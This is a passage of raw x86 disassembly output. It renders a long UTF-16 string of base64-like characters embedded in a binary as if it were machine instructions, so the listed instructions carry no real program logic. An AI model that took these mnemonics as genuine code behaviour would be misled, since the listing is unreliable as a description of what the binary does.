  409b67:	00 50 00             	add    %dl,0x0(%eax)
  409b6a:	38 00                	cmp    %al,(%eax)
  409b6c:	68 00 6c 00 6e       	push   $0x6e006c00
  409b71:	00 63 00             	add    %ah,0x0(%ebx)
  409b74:	59                   	pop    %ecx
  409b75:	00 70 00             	add    %dh,0x0(%eax)
  409b78:	4f                   	dec    %edi
  409b79:	00 65 00             	add    %ah,0x0(%ebp)
  409b7c:	66 00 56 00          	data16 add %dl,0x0(%esi)
  409b80:	37                   	aaa
  409b81:	00 38                	add    %bh,(%eax)
  409b83:	00 71 00             	add    %dh,0x0(%ecx)
  409b86:	62 00                	bound  %eax,(%eax)
  409b88:	41                   	inc    %ecx
  409b89:	00 5a 00             	add    %bl,0x0(%edx)
  409b8c:	6f                   	outsl  %ds:(%esi),(%dx)
  409b8d:	00 35 00 33 00 73    	add    %dh,0x73003300
  409b93:	00 71 00             	add    %dh,0x0(%ecx)
  409b96:	47                   	inc    %edi
  409b97:	00 59 00             	add    %bl,0x0(%ecx)
  409b9a:	49                   	dec    %ecx
  409b9b:	00 35 00 4a 00 51    	add    %dh,0x51004a00
  409ba1:	00 63 00             	add    %ah,0x0(%ebx)
  409ba4:	51                   	push   %ecx
  409ba5:	00 32                	add    %dh,(%edx)
  409ba7:	00 69 00             	add    %ch,0x0(%ecx)
  409baa:	4a                   	dec    %edx
  409bab:	00 71 00             	add    %dh,0x0(%ecx)
  409bae:	57                   	push   %edi
  409baf:	00 35 00 66 00 77    	add    %dh,0x77006600
  409bb5:	00 50 00             	add    %dl,0x0(%eax)
  409bb8:	77 00                	ja     0x409bba
  409bba:	6f                   	outsl  %ds:(%esi),(%dx)
  409bbb:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
  409bbf:	00 55 00             	add    %dl,0x0(%ebp)
  409bc2:	76 00                	jbe    0x409bc4
  409bc4:	66 00 43 00          	data16 add %al,0x0(%ebx)
  409bc8:	6f                   	outsl  %ds:(%esi),(%dx)
  409bc9:	00 71 00             	add    %dh,0x0(%ecx)
  409bcc:	56                   	push   %esi
  409bcd:	00 43 00             	add    %al,0x0(%ebx)
  409bd0:	51                   	push   %ecx
  409bd1:	00 45 00             	add    %al,0x0(%ebp)
  409bd4:	5a                   	pop    %edx
  409bd5:	00 56 00             	add    %dl,0x0(%esi)
  409bd8:	74 00                	je     0x409bda
  409bda:	41                   	inc    %ecx
  409bdb:	00 6b 00             	add    %ch,0x0(%ebx)
  409bde:	39 00                	cmp    %eax,(%eax)
  409be0:	66 00 57 00          	data16 add %dl,0x0(%edi)
  409be4:	45                   	inc    %ebp
  409be5:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  409be9:	00 78 00             	add    %bh,0x0(%eax)
  409bec:	67 00 57 00          	add    %dl,0x0(%bx)
  409bf0:	45                   	inc    %ebp
  409bf1:	00 34 00             	add    %dh,(%eax,%eax,1)
  409bf4:	30 00                	xor    %al,(%eax)
  409bf6:	45                   	inc    %ebp
  409bf7:	00 63 00             	add    %ah,0x0(%ebx)
  409bfa:	70 00                	jo     0x409bfc
  409bfc:	39 00                	cmp    %eax,(%eax)
  409bfe:	4c                   	dec    %esp
  409bff:	00 39                	add    %bh,(%ecx)
  409c01:	00 78 00             	add    %bh,0x0(%eax)
  409c04:	32 00                	xor    (%eax),%al
  409c06:	79 00                	jns    0x409c08
  409c08:	7a 00                	jp     0x409c0a
  409c0a:	4a                   	dec    %edx
  409c0b:	00 57 00             	add    %dl,0x0(%edi)
  409c0e:	71 00                	jno    0x409c10
  409c10:	41                   	inc    %ecx
  409c11:	00 61 00             	add    %ah,0x0(%ecx)
  409c14:	72 00                	jb     0x409c16
  409c16:	53                   	push   %ebx
  409c17:	00 51 00             	add    %dl,0x0(%ecx)
  409c1a:	67 00 57 00          	add    %dl,0x0(%bx)
  409c1e:	76 00                	jbe    0x409c20
  409c20:	78 00                	js     0x409c22
  409c22:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  409c26:	35 00 6c 00 51       	xor    $0x51006c00,%eax
  409c2b:	00 76 00             	add    %dh,0x0(%esi)
  409c2e:	4b                   	dec    %ebx
  409c2f:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
  409c33:	00 65 00             	add    %ah,0x0(%ebp)
  409c36:	71 00                	jno    0x409c38
  409c38:	50                   	push   %eax
  409c39:	00 4a 00             	add    %cl,0x0(%edx)
  409c3c:	45                   	inc    %ebp
  409c3d:	00 62 00             	add    %ah,0x0(%edx)
  409c40:	4d                   	dec    %ebp
  409c41:	00 59 00             	add    %bl,0x0(%ecx)
  409c44:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409c48:	4a                   	dec    %edx
  409c49:	00 51 00             	add    %dl,0x0(%ecx)
  409c4c:	47                   	inc    %edi
  409c4d:	00 66 00             	add    %ah,0x0(%esi)
  409c50:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  409c54:	56                   	push   %esi
  409c55:	00 66 00             	add    %ah,0x0(%esi)
  409c58:	66 00 58 00          	data16 add %bl,0x0(%eax)
  409c5c:	52                   	push   %edx
  409c5d:	00 67 00             	add    %ah,0x0(%edi)
  409c60:	6c                   	insb   (%dx),%es:(%edi)
  409c61:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  409c65:	00 30                	add    %dh,(%eax)
  409c67:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  409c6b:	00 79 00             	add    %bh,0x0(%ecx)
  409c6e:	47                   	inc    %edi
  409c6f:	00 61 00             	add    %ah,0x0(%ecx)
  409c72:	33 00                	xor    (%eax),%eax
  409c74:	75 00                	jne    0x409c76
  409c76:	59                   	pop    %ecx
  409c77:	00 32                	add    %dh,(%edx)
  409c79:	00 6c 00 31          	add    %ch,0x31(%eax,%eax,1)
  409c7d:	00 75 00             	add    %dh,0x0(%ebp)
  409c80:	4d                   	dec    %ebp
  409c81:	00 6a 00             	add    %ch,0x0(%edx)
  409c84:	63 00                	arpl   %eax,(%eax)
  409c86:	38 00                	cmp    %al,(%eax)
  409c88:	5a                   	pop    %edx
  409c89:	00 63 00             	add    %ah,0x0(%ebx)
  409c8c:	68 00 50 00 75       	push   $0x75005000
  409c91:	00 53 00             	add    %dl,0x0(%ebx)
  409c94:	67 00 46 00          	add    %al,0x0(%bp)
  409c98:	52                   	push   %edx
  409c99:	00 69 00             	add    %ch,0x0(%ecx)
  409c9c:	70 00                	jo     0x409c9e
  409c9e:	4c                   	dec    %esp
  409c9f:	00 33                	add    %dh,(%ebx)
  409ca1:	00 7a 00             	add    %bh,0x0(%edx)
  409ca4:	73 00                	jae    0x409ca6
  409ca6:	4e                   	dec    %esi
  409ca7:	00 30                	add    %dh,(%eax)
  409ca9:	00 41 00             	add    %al,0x0(%ecx)
  409cac:	39 00                	cmp    %eax,(%eax)
  409cae:	77 00                	ja     0x409cb0
  409cb0:	6d                   	insl   (%dx),%es:(%edi)
  409cb1:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  409cb5:	00 31                	add    %dh,(%ecx)
  409cb7:	00 51 00             	add    %dl,0x0(%ecx)
  409cba:	41                   	inc    %ecx
  409cbb:	00 50 00             	add    %dl,0x0(%eax)
  409cbe:	36 00 46 00          	add    %al,%ss:0x0(%esi)
  409cc2:	30 00                	xor    %al,(%eax)
  409cc4:	39 00                	cmp    %eax,(%eax)
  409cc6:	31 00                	xor    %eax,(%eax)
  409cc8:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  409ccc:	7a 00                	jp     0x409cce
  409cce:	56                   	push   %esi
  409ccf:	00 70 00             	add    %dh,0x0(%eax)
  409cd2:	4d                   	dec    %ebp
  409cd3:	00 57 00             	add    %dl,0x0(%edi)
  409cd6:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  409cda:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  409cde:	34 00                	xor    $0x0,%al
  409ce0:	67 00 6d 00          	add    %ch,0x0(%di)
  409ce4:	7a 00                	jp     0x409ce6
  409ce6:	43                   	inc    %ebx
  409ce7:	00 48 00             	add    %cl,0x0(%eax)
  409cea:	31 00                	xor    %eax,(%eax)
  409cec:	72 00                	jb     0x409cee
  409cee:	53                   	push   %ebx
  409cef:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  409cf3:	00 37                	add    %dh,(%edi)
  409cf5:	00 6a 00             	add    %ch,0x0(%edx)
  409cf8:	53                   	push   %ebx
  409cf9:	00 63 00             	add    %ah,0x0(%ebx)
  409cfc:	73 00                	jae    0x409cfe
  409cfe:	57                   	push   %edi
  409cff:	00 59 00             	add    %bl,0x0(%ecx)
  409d02:	4d                   	dec    %ebp
  409d03:	00 69 00             	add    %ch,0x0(%ecx)
  409d06:	59                   	pop    %ecx
  409d07:	00 6e 00             	add    %ch,0x0(%esi)
  409d0a:	72 00                	jb     0x409d0c
  409d0c:	45                   	inc    %ebp
  409d0d:	00 76 00             	add    %dh,0x0(%esi)
  409d10:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  409d14:	6f                   	outsl  %ds:(%esi),(%dx)
  409d15:	00 72 00             	add    %dh,0x0(%edx)
  409d18:	63 00                	arpl   %eax,(%eax)
  409d1a:	46                   	inc    %esi
  409d1b:	00 41 00             	add    %al,0x0(%ecx)
  409d1e:	59                   	pop    %ecx
  409d1f:	00 39                	add    %bh,(%ecx)
  409d21:	00 37                	add    %dh,(%edi)
  409d23:	00 73 00             	add    %dh,0x0(%ebx)
  409d26:	4c                   	dec    %esp
  409d27:	00 48 00             	add    %cl,0x0(%eax)
  409d2a:	37                   	aaa
  409d2b:	00 72 00             	add    %dh,0x0(%edx)
  409d2e:	2b 00                	sub    (%eax),%eax
  409d30:	75 00                	jne    0x409d32
  409d32:	59                   	pop    %ecx
  409d33:	00 4d 00             	add    %cl,0x0(%ebp)
  409d36:	59                   	pop    %ecx
  409d37:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  409d3b:	00 50 00             	add    %dl,0x0(%eax)
  409d3e:	46                   	inc    %esi
  409d3f:	00 47 00             	add    %al,0x0(%edi)
  409d42:	42                   	inc    %edx
  409d43:	00 33                	add    %dh,(%ebx)
  409d45:	00 43 00             	add    %al,0x0(%ebx)
  409d48:	39 00                	cmp    %eax,(%eax)
  409d4a:	71 00                	jno    0x409d4c
  409d4c:	73 00                	jae    0x409d4e
  409d4e:	33 00                	xor    (%eax),%eax
  409d50:	55                   	push   %ebp
  409d51:	00 37                	add    %dh,(%edi)
  409d53:	00 42 00             	add    %al,0x0(%edx)
  409d56:	33 00                	xor    (%eax),%eax
  409d58:	6e                   	outsb  %ds:(%esi),(%dx)
  409d59:	00 41 00             	add    %al,0x0(%ecx)
  409d5c:	71 00                	jno    0x409d5e
  409d5e:	35 00 6f 00 77       	xor    $0x77006f00,%eax
  409d63:	00 68 00             	add    %ch,0x0(%eax)
  409d66:	33 00                	xor    (%eax),%eax
  409d68:	64 00 4c 00 4c       	add    %cl,%fs:0x4c(%eax,%eax,1)
  409d6d:	00 32                	add    %dh,(%edx)
  409d6f:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  409d73:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  409d77:	00 72 00             	add    %dh,0x0(%edx)
  409d7a:	55                   	push   %ebp
  409d7b:	00 78 00             	add    %bh,0x0(%eax)
  409d7e:	51                   	push   %ecx
  409d7f:	00 56 00             	add    %dl,0x0(%esi)
  409d82:	57                   	push   %edi
  409d83:	00 44 00 76          	add    %al,0x76(%eax,%eax,1)
  409d87:	00 38                	add    %bh,(%eax)
  409d89:	00 7a 00             	add    %bh,0x0(%edx)
  409d8c:	33 00                	xor    (%eax),%eax
  409d8e:	74 00                	je     0x409d90
  409d90:	76 00                	jbe    0x409d92
  409d92:	4b                   	dec    %ebx
  409d93:	00 51 00             	add    %dl,0x0(%ecx)
  409d96:	72 00                	jb     0x409d98
  409d98:	61                   	popa
  409d99:	00 47 00             	add    %al,0x0(%edi)
  409d9c:	42                   	inc    %edx
  409d9d:	00 2b                	add    %ch,(%ebx)
  409d9f:	00 53 00             	add    %dl,0x0(%ebx)
  409da2:	6c                   	insb   (%dx),%es:(%edi)
  409da3:	00 6b 00             	add    %ch,0x0(%ebx)
  409da6:	4d                   	dec    %ebp
  409da7:	00 78 00             	add    %bh,0x0(%eax)
  409daa:	44                   	inc    %esp
  409dab:	00 49 00             	add    %cl,0x0(%ecx)
  409dae:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  409db2:	61                   	popa
  409db3:	00 37                	add    %dh,(%edi)
  409db5:	00 37                	add    %dh,(%edi)
  409db7:	00 53 00             	add    %dl,0x0(%ebx)
  409dba:	32 00                	xor    (%eax),%al
  409dbc:	70 00                	jo     0x409dbe
  409dbe:	51                   	push   %ecx
  409dbf:	00 65 00             	add    %ah,0x0(%ebp)
  409dc2:	58                   	pop    %eax
  409dc3:	00 51 00             	add    %dl,0x0(%ecx)
  409dc6:	37                   	aaa
  409dc7:	00 78 00             	add    %bh,0x0(%eax)
  409dca:	45                   	inc    %ebp
  409dcb:	00 55 00             	add    %dl,0x0(%ebp)
  409dce:	44                   	inc    %esp
  409dcf:	00 4b 00             	add    %cl,0x0(%ebx)
  409dd2:	53                   	push   %ebx
  409dd3:	00 4b 00             	add    %cl,0x0(%ebx)
  409dd6:	35 00 5a 00 6e       	xor    $0x6e005a00,%eax
  409ddb:	00 79 00             	add    %bh,0x0(%ecx)
  409dde:	32 00                	xor    (%eax),%al
  409de0:	6b 00 72             	imul   $0x72,(%eax),%eax
  409de3:	00 31                	add    %dh,(%ecx)
  409de5:	00 6b 00             	add    %ch,0x0(%ebx)
  409de8:	70 00                	jo     0x409dea
  409dea:	6f                   	outsl  %ds:(%esi),(%dx)
  409deb:	00 38                	add    %bh,(%eax)
  409ded:	00 6a 00             	add    %ch,0x0(%edx)
  409df0:	34 00                	xor    $0x0,%al
  409df2:	65 00 39             	add    %bh,%gs:(%ecx)
  409df5:	00 41 00             	add    %al,0x0(%ecx)
  409df8:	53                   	push   %ebx
  409df9:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  409dfd:	00 76 00             	add    %dh,0x0(%esi)
  409e00:	47                   	inc    %edi
  409e01:	00 46 00             	add    %al,0x0(%esi)
  409e04:	46                   	inc    %esi
  409e05:	00 6e 00             	add    %ch,0x0(%esi)
  409e08:	66 00 2f             	data16 add %ch,(%edi)
  409e0b:	00 46 00             	add    %al,0x0(%esi)
  409e0e:	30 00                	xor    %al,(%eax)
  409e10:	63 00                	arpl   %eax,(%eax)
  409e12:	56                   	push   %esi
  409e13:	00 69 00             	add    %ch,0x0(%ecx)
  409e16:	6c                   	insb   (%dx),%es:(%edi)
  409e17:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
  409e1b:	00 4e 00             	add    %cl,0x0(%esi)
  409e1e:	51                   	push   %ecx
  409e1f:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  409e23:	00 66 00             	add    %ah,0x0(%esi)
  409e26:	46                   	inc    %esi
  409e27:	00 53 00             	add    %dl,0x0(%ebx)
  409e2a:	47                   	inc    %edi
  409e2b:	00 4f 00             	add    %cl,0x0(%edi)
  409e2e:	7a 00                	jp     0x409e30
  409e30:	33 00                	xor    (%eax),%eax
  409e32:	52                   	push   %edx
  409e33:	00 36                	add    %dh,(%esi)
  409e35:	00 41 00             	add    %al,0x0(%ecx)
  409e38:	67 00 47 00          	add    %al,0x0(%bx)
  409e3c:	69 00 56 00 45 00    	imul   $0x450056,(%eax),%eax
  409e42:	33 00                	xor    (%eax),%eax
  409e44:	6f                   	outsl  %ds:(%esi),(%dx)
  409e45:	00 4b 00             	add    %cl,0x0(%ebx)
  409e48:	76 00                	jbe    0x409e4a
  409e4a:	4f                   	dec    %edi
  409e4b:	00 52 00             	add    %dl,0x0(%edx)
  409e4e:	47                   	inc    %edi
  409e4f:	00 38                	add    %bh,(%eax)
  409e51:	00 34 00             	add    %dh,(%eax,%eax,1)
  409e54:	6b 00 31             	imul   $0x31,(%eax),%eax
  409e57:	00 55 00             	add    %dl,0x0(%ebp)
  409e5a:	53                   	push   %ebx
  409e5b:	00 73 00             	add    %dh,0x0(%ebx)
  409e5e:	6e                   	outsb  %ds:(%esi),(%dx)
  409e5f:	00 57 00             	add    %dl,0x0(%edi)
  409e62:	78 00                	js     0x409e64
  409e64:	36 00 44 00 73       	add    %al,%ss:0x73(%eax,%eax,1)
  409e69:	00 46 00             	add    %al,0x0(%esi)
  409e6c:	2f                   	das
  409e6d:	00 2f                	add    %ch,(%edi)
  409e6f:	00 75 00             	add    %dh,0x0(%ebp)
  409e72:	58                   	pop    %eax
  409e73:	00 4e 00             	add    %cl,0x0(%esi)
  409e76:	64 00 2b             	add    %ch,%fs:(%ebx)
  409e79:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
  409e7d:	00 30                	add    %dh,(%eax)
  409e7f:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  409e83:	00 4d 00             	add    %cl,0x0(%ebp)
  409e86:	70 00                	jo     0x409e88
  409e88:	50                   	push   %eax
  409e89:	00 65 00             	add    %ah,0x0(%ebp)
  409e8c:	5a                   	pop    %edx
  409e8d:	00 5a 00             	add    %bl,0x0(%edx)
  409e90:	54                   	push   %esp
  409e91:	00 57 00             	add    %dl,0x0(%edi)
  409e94:	34 00                	xor    $0x0,%al
  409e96:	63 00                	arpl   %eax,(%eax)
  409e98:	49                   	dec    %ecx
  409e99:	00 49 00             	add    %cl,0x0(%ecx)
  409e9c:	6d                   	insl   (%dx),%es:(%edi)
  409e9d:	00 39                	add    %bh,(%ecx)
  409e9f:	00 58 00             	add    %bl,0x0(%eax)
  409ea2:	56                   	push   %esi
  409ea3:	00 2b                	add    %ch,(%ebx)
  409ea5:	00 2b                	add    %ch,(%ebx)
  409ea7:	00 59 00             	add    %bl,0x0(%ecx)
  409eaa:	62 00                	bound  %eax,(%eax)
  409eac:	76 00                	jbe    0x409eae
  409eae:	4c                   	dec    %esp
  409eaf:	00 4d 00             	add    %cl,0x0(%ebp)
  409eb2:	41                   	inc    %ecx
  409eb3:	00 4a 00             	add    %cl,0x0(%edx)
  409eb6:	4f                   	dec    %edi
  409eb7:	00 4e 00             	add    %cl,0x0(%esi)
  409eba:	2b 00                	sub    (%eax),%eax
  409ebc:	65 00 6c 00 6b       	add    %ch,%gs:0x6b(%eax,%eax,1)
  409ec1:	00 79 00             	add    %bh,0x0(%ecx)
  409ec4:	4e                   	dec    %esi
  409ec5:	00 34 00             	add    %dh,(%eax,%eax,1)
  409ec8:	39 00                	cmp    %eax,(%eax)
  409eca:	78 00                	js     0x409ecc
  409ecc:	4e                   	dec    %esi
  409ecd:	00 77 00             	add    %dh,0x0(%edi)
  409ed0:	56                   	push   %esi
  409ed1:	00 61 00             	add    %ah,0x0(%ecx)
  409ed4:	59                   	pop    %ecx
  409ed5:	00 31                	add    %dh,(%ecx)
  409ed7:	00 53 00             	add    %dl,0x0(%ebx)
  409eda:	6a 00                	push   $0x0
  409edc:	43                   	inc    %ebx
  409edd:	00 4a 00             	add    %cl,0x0(%edx)
  409ee0:	53                   	push   %ebx
  409ee1:	00 54 00 77          	add    %dl,0x77(%eax,%eax,1)
  409ee5:	00 62 00             	add    %ah,0x0(%edx)
  409ee8:	4c                   	dec    %esp
  409ee9:	00 50 00             	add    %dl,0x0(%eax)
  409eec:	50                   	push   %eax
  409eed:	00 67 00             	add    %ah,0x0(%edi)
  409ef0:	4c                   	dec    %esp
  409ef1:	00 6b 00             	add    %ch,0x0(%ebx)
  409ef4:	78 00                	js     0x409ef6
  409ef6:	77 00                	ja     0x409ef8
  409ef8:	49                   	dec    %ecx
  409ef9:	00 5a 00             	add    %bl,0x0(%edx)
  409efc:	75 00                	jne    0x409efe
  409efe:	78 00                	js     0x409f00
  409f00:	32 00                	xor    (%eax),%al
  409f02:	42                   	inc    %edx
  409f03:	00 77 00             	add    %dh,0x0(%edi)
  409f06:	4f                   	dec    %edi
  409f07:	00 7a 00             	add    %bh,0x0(%edx)
  409f0a:	69 00 52 00 50 00    	imul   $0x500052,(%eax),%eax
  409f10:	72 00                	jb     0x409f12
  409f12:	67 00 76 00          	add    %dh,0x0(%bp)
  409f16:	39 00                	cmp    %eax,(%eax)
  409f18:	76 00                	jbe    0x409f1a
  409f1a:	41                   	inc    %ecx
  409f1b:	00 41 00             	add    %al,0x0(%ecx)
  409f1e:	4a                   	dec    %edx
  409f1f:	00 63 00             	add    %ah,0x0(%ebx)
  409f22:	69 00 53 00 73 00    	imul   $0x730053,(%eax),%eax
  409f28:	31 00                	xor    %eax,(%eax)
  409f2a:	45                   	inc    %ebp
  409f2b:	00 35 00 56 00 42    	add    %dh,0x42005600
  409f31:	00 31                	add    %dh,(%ecx)
  409f33:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
  409f37:	00 47 00             	add    %al,0x0(%edi)
  409f3a:	71 00                	jno    0x409f3c
  409f3c:	76 00                	jbe    0x409f3e
  409f3e:	43                   	inc    %ebx
  409f3f:	00 6d 00             	add    %ch,0x0(%ebp)
  409f42:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  409f46:	6c                   	insb   (%dx),%es:(%edi)
  409f47:	00 61 00             	add    %ah,0x0(%ecx)
  409f4a:	53                   	push   %ebx
  409f4b:	00 45 00             	add    %al,0x0(%ebp)
  409f4e:	42                   	inc    %edx
  409f4f:	00 63 00             	add    %ah,0x0(%ebx)
  409f52:	54                   	push   %esp
  409f53:	00 51 00             	add    %dl,0x0(%ecx)
  409f56:	39 00                	cmp    %eax,(%eax)
  409f58:	52                   	push   %edx
  409f59:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  409f5d:	00 56 00             	add    %dl,0x0(%esi)
  409f60:	56                   	push   %esi
  409f61:	00 4f 00             	add    %cl,0x0(%edi)
  409f64:	53                   	push   %ebx
  409f65:	00 61 00             	add    %ah,0x0(%ecx)
  409f68:	77 00                	ja     0x409f6a
  409f6a:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  409f6e:	48                   	dec    %eax
  409f6f:	00 47 00             	add    %al,0x0(%edi)
  409f72:	6f                   	outsl  %ds:(%esi),(%dx)
  409f73:	00 6b 00             	add    %ch,0x0(%ebx)
  409f76:	33 00                	xor    (%eax),%eax
  409f78:	62 00                	bound  %eax,(%eax)
  409f7a:	35 00 44 00 74       	xor    $0x74004400,%eax
  409f7f:	00 33                	add    %dh,(%ebx)
  409f81:	00 6f 00             	add    %ch,0x0(%edi)
  409f84:	6e                   	outsb  %ds:(%esi),(%dx)
  409f85:	00 65 00             	add    %ah,0x0(%ebp)
  409f88:	56                   	push   %esi
  409f89:	00 42 00             	add    %al,0x0(%edx)
  409f8c:	6f                   	outsl  %ds:(%esi),(%dx)
  409f8d:	00 32                	add    %dh,(%edx)
  409f8f:	00 6b 00             	add    %ch,0x0(%ebx)
  409f92:	4e                   	dec    %esi
  409f93:	00 6f 00             	add    %ch,0x0(%edi)
  409f96:	50                   	push   %eax
  409f97:	00 30                	add    %dh,(%eax)
  409f99:	00 73 00             	add    %dh,0x0(%ebx)
  409f9c:	37                   	aaa
  409f9d:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  409fa1:	00 6e 00             	add    %ch,0x0(%esi)
  409fa4:	53                   	push   %ebx
  409fa5:	00 75 00             	add    %dh,0x0(%ebp)
  409fa8:	54                   	push   %esp
  409fa9:	00 56 00             	add    %dl,0x0(%esi)
  409fac:	6f                   	outsl  %ds:(%esi),(%dx)
  409fad:	00 53 00             	add    %dl,0x0(%ebx)
  409fb0:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  409fb4:	48                   	dec    %eax
  409fb5:	00 72 00             	add    %dh,0x0(%edx)
  409fb8:	42                   	inc    %edx
  409fb9:	00 4a 00             	add    %cl,0x0(%edx)
  409fbc:	72 00                	jb     0x409fbe
  409fbe:	5a                   	pop    %edx
  409fbf:	00 2f                	add    %ch,(%edi)
  409fc1:	00 34 00             	add    %dh,(%eax,%eax,1)
  409fc4:	4c                   	dec    %esp
  409fc5:	00 72 00             	add    %dh,0x0(%edx)
  409fc8:	79 00                	jns    0x409fca
  409fca:	32 00                	xor    (%eax),%al
  409fcc:	66 00 68 00          	data16 add %ch,0x0(%eax)
  409fd0:	5a                   	pop    %edx
  409fd1:	00 2b                	add    %ch,(%ebx)
  409fd3:	00 76 00             	add    %dh,0x0(%esi)
  409fd6:	44                   	inc    %esp
  409fd7:	00 66 00             	add    %ah,0x0(%esi)
  409fda:	77 00                	ja     0x409fdc
  409fdc:	4a                   	dec    %edx
  409fdd:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
  409fe1:	00 6f 00             	add    %ch,0x0(%edi)
  409fe4:	54                   	push   %esp
  409fe5:	00 67 00             	add    %ah,0x0(%edi)
  409fe8:	68 00 56 00 47       	push   $0x47005600
  409fed:	00 45 00             	add    %al,0x0(%ebp)
  409ff0:	70 00                	jo     0x409ff2
  409ff2:	4a                   	dec    %edx
  409ff3:	00 43 00             	add    %al,0x0(%ebx)
  409ff6:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  409ffa:	74 00                	je     0x409ffc
  409ffc:	62 00                	bound  %eax,(%eax)
  409ffe:	6d                   	insl   (%dx),%es:(%edi)
  409fff:	00 4f 00             	add    %cl,0x0(%edi)
  40a002:	39 00                	cmp    %eax,(%eax)
  40a004:	78 00                	js     0x40a006
  40a006:	68 00 6c 00 4d       	push   $0x4d006c00
  40a00b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a00e:	61                   	popa
  40a00f:	00 5a 00             	add    %bl,0x0(%edx)
  40a012:	6f                   	outsl  %ds:(%esi),(%dx)
  40a013:	00 75 00             	add    %dh,0x0(%ebp)
  40a016:	68 00 47 00 41       	push   $0x41004700
  40a01b:	00 56 00             	add    %dl,0x0(%esi)
  40a01e:	42                   	inc    %edx
  40a01f:	00 56 00             	add    %dl,0x0(%esi)
  40a022:	71 00                	jno    0x40a024
  40a024:	6f                   	outsl  %ds:(%esi),(%dx)
  40a025:	00 6e 00             	add    %ch,0x0(%esi)
  40a028:	6f                   	outsl  %ds:(%esi),(%dx)
  40a029:	00 42 00             	add    %al,0x0(%edx)
  40a02c:	54                   	push   %esp
  40a02d:	00 35 00 73 00 78    	add    %dh,0x78007300
  40a033:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
  40a037:	00 57 00             	add    %dl,0x0(%edi)
  40a03a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a03b:	00 77 00             	add    %dh,0x0(%edi)
  40a03e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a03f:	00 75 00             	add    %dh,0x0(%ebp)
  40a042:	67 00 33             	add    %dh,(%bp,%di)
  40a045:	00 46 00             	add    %al,0x0(%esi)
  40a048:	4e                   	dec    %esi
  40a049:	00 6d 00             	add    %ch,0x0(%ebp)
  40a04c:	66 00 44 00 78       	data16 add %al,0x78(%eax,%eax,1)
  40a051:	00 65 00             	add    %ah,0x0(%ebp)
  40a054:	69 00 7a 00 69 00    	imul   $0x69007a,(%eax),%eax
  40a05a:	32 00                	xor    (%eax),%al
  40a05c:	68 00 4c 00 53       	push   $0x53004c00
  40a061:	00 65 00             	add    %ah,0x0(%ebp)
  40a064:	76 00                	jbe    0x40a066
  40a066:	62 00                	bound  %eax,(%eax)
  40a068:	4d                   	dec    %ebp
  40a069:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  40a06d:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40a071:	00 61 00             	add    %ah,0x0(%ecx)
  40a074:	30 00                	xor    %al,(%eax)
  40a076:	2b 00                	sub    (%eax),%eax
  40a078:	5a                   	pop    %edx
  40a079:	00 35 00 79 00 30    	add    %dh,0x30007900
  40a07f:	00 71 00             	add    %dh,0x0(%ecx)
  40a082:	4f                   	dec    %edi
  40a083:	00 63 00             	add    %ah,0x0(%ebx)
  40a086:	43                   	inc    %ebx
  40a087:	00 66 00             	add    %ah,0x0(%esi)
  40a08a:	50                   	push   %eax
  40a08b:	00 38                	add    %bh,(%eax)
  40a08d:	00 4c 00 4a          	add    %cl,0x4a(%eax,%eax,1)
  40a091:	00 4a 00             	add    %cl,0x0(%edx)
  40a094:	71 00                	jno    0x40a096
  40a096:	2f                   	das
  40a097:	00 52 00             	add    %dl,0x0(%edx)
  40a09a:	70 00                	jo     0x40a09c
  40a09c:	36 00 46 00          	add    %al,%ss:0x0(%esi)
  40a0a0:	6b 00 72             	imul   $0x72,(%eax),%eax
  40a0a3:	00 73 00             	add    %dh,0x0(%ebx)
  40a0a6:	7a 00                	jp     0x40a0a8
  40a0a8:	79 00                	jns    0x40a0aa
  40a0aa:	6d                   	insl   (%dx),%es:(%edi)
  40a0ab:	00 56 00             	add    %dl,0x0(%esi)
  40a0ae:	79 00                	jns    0x40a0b0
  40a0b0:	75 00                	jne    0x40a0b2
  40a0b2:	6b 00 44             	imul   $0x44,(%eax),%eax
  40a0b5:	00 6f 00             	add    %ch,0x0(%edi)
  40a0b8:	6c                   	insb   (%dx),%es:(%edi)
  40a0b9:	00 6a 00             	add    %ch,0x0(%edx)
  40a0bc:	45                   	inc    %ebp
  40a0bd:	00 6f 00             	add    %ch,0x0(%edi)
  40a0c0:	48                   	dec    %eax
  40a0c1:	00 2f                	add    %ch,(%edi)
  40a0c3:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40a0c7:	00 58 00             	add    %bl,0x0(%eax)
  40a0ca:	70 00                	jo     0x40a0cc
  40a0cc:	51                   	push   %ecx
  40a0cd:	00 68 00             	add    %ch,0x0(%eax)
